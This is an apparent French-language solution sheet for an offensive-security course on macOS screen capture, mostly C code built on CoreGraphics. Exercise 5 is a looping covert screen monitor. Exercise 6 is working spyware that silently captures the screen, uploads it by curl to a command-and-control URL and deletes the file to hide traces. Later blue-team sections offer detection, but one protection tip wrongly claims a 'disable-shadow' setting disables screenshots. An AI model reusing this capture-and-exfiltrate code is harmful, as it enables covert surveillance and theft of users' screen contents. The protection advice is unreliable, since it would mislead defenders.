# SOLUTION : Screenshot macOS

## Exercice 1 : Screenshot avec screencapture (command-line)

```bash
# Screenshot plein écran
screencapture ~/Desktop/screenshot.png

# Avec délai de 5 secondes
screencapture -T 5 ~/Desktop/delayed.png

# Capture d'une fenêtre spécifique (interactif)
screencapture -w ~/Desktop/window.png

# Capture sans son
screencapture -x ~/Desktop/silent.png

# Capture en clipboard
screencapture -c
```

**Depuis C** :
```c
// screenshot_cmd.c
#include <stdlib.h>
#include <stdio.h>

int main() {
    printf("[*] Taking screenshot...\n");
    system("screencapture -x /tmp/screenshot.png");
    printf("[+] Screenshot saved to /tmp/screenshot.png\n");
    return 0;
}
```

---

## Exercice 2 : Screenshot avec CGWindowListCreateImage

```c
// screenshot_cg.c
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>

void take_screenshot(const char *filename) {
    // Capturer tout l'écran
    CGImageRef screenshot = CGWindowListCreateImage(
        CGRectInfinite,
        kCGWindowListOptionOnScreenOnly,
        kCGNullWindowID,
        kCGWindowImageDefault
    );

    if (!screenshot) {
        printf("[-] Failed to capture screenshot\n");
        return;
    }

    // Sauvegarder en PNG
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL,
        (const UInt8 *)filename,
        strlen(filename),
        false
    );

    CGImageDestinationRef destination = CGImageDestinationCreateWithURL(
        url,
        kUTTypePNG,
        1,
        NULL
    );

    if (destination) {
        CGImageDestinationAddImage(destination, screenshot, NULL);
        CGImageDestinationFinalize(destination);
        CFRelease(destination);

        printf("[+] Screenshot saved to: %s\n", filename);
    } else {
        printf("[-] Failed to save screenshot\n");
    }

    CFRelease(url);
    CGImageRelease(screenshot);
}

int main() {
    // Note: Nécessite Screen Recording permission (TCC)
    take_screenshot("/tmp/screenshot.png");
    return 0;
}
```

**Compilation** :
```bash
clang screenshot_cg.c -o screenshot_cg -framework ApplicationServices -framework CoreGraphics
./screenshot_cg

# Note: macOS demandera permission Screen Recording
```

---

## Exercice 3 : Screenshot d'un display spécifique

```c
// screenshot_display.c
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>

void screenshot_display(uint32_t display_id, const char *filename) {
    CGImageRef screenshot = CGDisplayCreateImage(display_id);

    if (!screenshot) {
        printf("[-] Failed to capture display %d\n", display_id);
        return;
    }

    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)filename, strlen(filename), false
    );

    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(
        url, kUTTypePNG, 1, NULL
    );

    CGImageDestinationAddImage(dest, screenshot, NULL);
    CGImageDestinationFinalize(dest);

    CFRelease(dest);
    CFRelease(url);
    CGImageRelease(screenshot);

    printf("[+] Display %d captured\n", display_id);
}

void list_displays() {
    uint32_t max_displays = 10;
    CGDirectDisplayID displays[max_displays];
    uint32_t count;

    CGGetActiveDisplayList(max_displays, displays, &count);

    printf("[*] Active displays: %d\n\n", count);

    for (uint32_t i = 0; i < count; i++) {
        CGRect bounds = CGDisplayBounds(displays[i]);
        printf("[%d] Display ID: %d\n", i, displays[i]);
        printf("    Resolution: %.0fx%.0f\n", bounds.size.width, bounds.size.height);
        printf("    Position: (%.0f, %.0f)\n\n", bounds.origin.x, bounds.origin.y);
    }
}

int main() {
    list_displays();

    // Capturer display principal
    CGDirectDisplayID main_display = CGMainDisplayID();
    screenshot_display(main_display, "/tmp/main_display.png");

    return 0;
}
```

---

## Exercice 4 : Screenshot d'une fenêtre spécifique

```c
// screenshot_window.c
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>

void screenshot_window(CGWindowID window_id, const char *filename) {
    CGImageRef screenshot = CGWindowListCreateImage(
        CGRectNull,
        kCGWindowListOptionIncludingWindow,
        window_id,
        kCGWindowImageBoundsIgnoreFraming
    );

    if (!screenshot) {
        printf("[-] Failed to capture window %d\n", window_id);
        return;
    }

    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)filename, strlen(filename), false
    );

    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(
        url, kUTTypePNG, 1, NULL
    );

    CGImageDestinationAddImage(dest, screenshot, NULL);
    CGImageDestinationFinalize(dest);

    CFRelease(dest);
    CFRelease(url);
    CGImageRelease(screenshot);

    printf("[+] Window %d captured\n", window_id);
}

void list_windows() {
    CFArrayRef window_list = CGWindowListCopyWindowInfo(
        kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements,
        kCGNullWindowID
    );

    CFIndex count = CFArrayGetCount(window_list);
    printf("[*] Found %ld windows\n\n", count);

    for (CFIndex i = 0; i < count; i++) {
        CFDictionaryRef window = CFArrayGetValueAtIndex(window_list, i);

        CFNumberRef window_id_ref = CFDictionaryGetValue(window, kCGWindowNumber);
        CFStringRef window_name = CFDictionaryGetValue(window, kCGWindowName);
        CFStringRef owner_name = CFDictionaryGetValue(window, kCGWindowOwnerName);

        int window_id;
        CFNumberGetValue(window_id_ref, kCFNumberIntType, &window_id);

        char name_buf[256] = "N/A";
        char owner_buf[256] = "N/A";

        if (window_name) {
            CFStringGetCString(window_name, name_buf, sizeof(name_buf),
                             kCFStringEncodingUTF8);
        }

        if (owner_name) {
            CFStringGetCString(owner_name, owner_buf, sizeof(owner_buf),
                             kCFStringEncodingUTF8);
        }

        printf("[%ld] Window ID: %d\n", i, window_id);
        printf("    App: %s\n", owner_buf);
        printf("    Title: %s\n\n", name_buf);
    }

    CFRelease(window_list);
}

int main() {
    list_windows();

    // Capturer la première fenêtre
    // (remplacer par window ID souhaité)

    return 0;
}
```

---

## Exercice 5 : Screenshot périodique (surveillance)

```c
// screenshot_monitor.c
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>

void take_timestamped_screenshot() {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    char filename[256];
    snprintf(filename, sizeof(filename),
             "/tmp/screenshot_%04d%02d%02d_%02d%02d%02d.png",
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);

    CGImageRef screenshot = CGWindowListCreateImage(
        CGRectInfinite,
        kCGWindowListOptionOnScreenOnly,
        kCGNullWindowID,
        kCGWindowImageDefault
    );

    if (!screenshot) {
        printf("[-] Screenshot failed\n");
        return;
    }

    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)filename, strlen(filename), false
    );

    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(
        url, kUTTypePNG, 1, NULL
    );

    CGImageDestinationAddImage(dest, screenshot, NULL);
    CGImageDestinationFinalize(dest);

    CFRelease(dest);
    CFRelease(url);
    CGImageRelease(screenshot);

    printf("[+] Screenshot: %s\n", filename);
}

int main(int argc, char *argv[]) {
    int interval = 60; // 60 secondes

    if (argc > 1) {
        interval = atoi(argv[1]);
    }

    printf("[*] Starting screenshot monitor (interval: %d seconds)\n", interval);
    printf("[*] Screenshots saved to /tmp/\n");
    printf("[*] Press Ctrl+C to stop\n\n");

    while (1) {
        take_timestamped_screenshot();
        sleep(interval);
    }

    return 0;
}
```

**Usage** :
```bash
./screenshot_monitor 30  # Screenshot toutes les 30 secondes
```

---

## Exercice 6 : Screenshot avec compression et exfiltration

```c
// screenshot_exfil.c
#include <ApplicationServices/ApplicationServices.h>
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>

int upload_file(const char *filename, const char *url) {
    CURL *curl = curl_easy_init();
    if (!curl) return 1;

    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        curl_easy_cleanup(curl);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READDATA, fp);

    CURLcode res = curl_easy_perform(curl);

    fclose(fp);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? 0 : 1;
}

void screenshot_and_exfil(const char *c2_url) {
    const char *tmp_file = "/tmp/.screenshot.png";

    // Prendre screenshot
    CGImageRef screenshot = CGWindowListCreateImage(
        CGRectInfinite,
        kCGWindowListOptionOnScreenOnly,
        kCGNullWindowID,
        kCGWindowImageDefault
    );

    if (!screenshot) return;

    // Sauvegarder (JPEG pour compression)
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)tmp_file, strlen(tmp_file), false
    );

    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(
        url, kUTTypeJPEG, 1, NULL
    );

    // Options de compression
    CFMutableDictionaryRef options = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks
    );

    float quality = 0.7; // 70% qualité
    CFNumberRef quality_ref = CFNumberCreate(NULL, kCFNumberFloatType, &quality);
    CFDictionarySetValue(options, kCGImageDestinationLossyCompressionQuality,
                        quality_ref);

    CGImageDestinationAddImage(dest, screenshot, options);
    CGImageDestinationFinalize(dest);

    CFRelease(options);
    CFRelease(quality_ref);
    CFRelease(dest);
    CFRelease(url);
    CGImageRelease(screenshot);

    printf("[+] Screenshot taken\n");

    // Exfiltrer
    if (upload_file(tmp_file, c2_url) == 0) {
        printf("[+] Screenshot exfiltrated\n");
        unlink(tmp_file); // Supprimer trace
    }
}

int main() {
    screenshot_and_exfil("http://c2-server.com/upload");
    return 0;
}
```

---

## Exercice 7 : Détecter screenshot capture (Blue Team)

```bash
# Monitoring avec log
log stream --predicate 'process == "screencaptureui" OR process == "screencapture"' --level debug

# Détecter accès Screen Recording
log show --predicate 'subsystem == "com.apple.TCC"' --last 1h | grep -i screen
```

**Code C pour détecter** :

```c
// detect_screenshot.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fp = popen("ps aux | grep -i screenshot | grep -v grep", "r");
    if (!fp) return 1;

    char buffer[256];
    int found = 0;

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("[!] Screenshot process detected: %s", buffer);
        found = 1;
    }

    pclose(fp);

    if (found) {
        printf("[!] ALERT: Screenshot activity detected!\n");
    }

    return 0;
}
```

---

## Exercice 8 : Protection contre screenshots

```bash
# 1. Désactiver screenshots globalement (nécessite SIP off)
defaults write com.apple.screencapture disable-shadow -bool true

# 2. App-specific: Détecter et bloquer
# (NSWindow property: sharingType)
```

**App protection (Objective-C)** :

```objc
// Dans votre app
[window setSharingType:NSWindowSharingNone];
// Empêche captures de cette fenêtre
```

---

## Resources

- [CGWindowListCreateImage](https://developer.apple.com/documentation/coregraphics/1455147-cgwindowlistcreateimage)
- [screencapture man page](https://ss64.com/osx/screencapture.html)
- [Screen Recording TCC](https://developer.apple.com/documentation/avfoundation/cameras_and_media_capture/requesting_authorization_for_media_capture_on_macos)
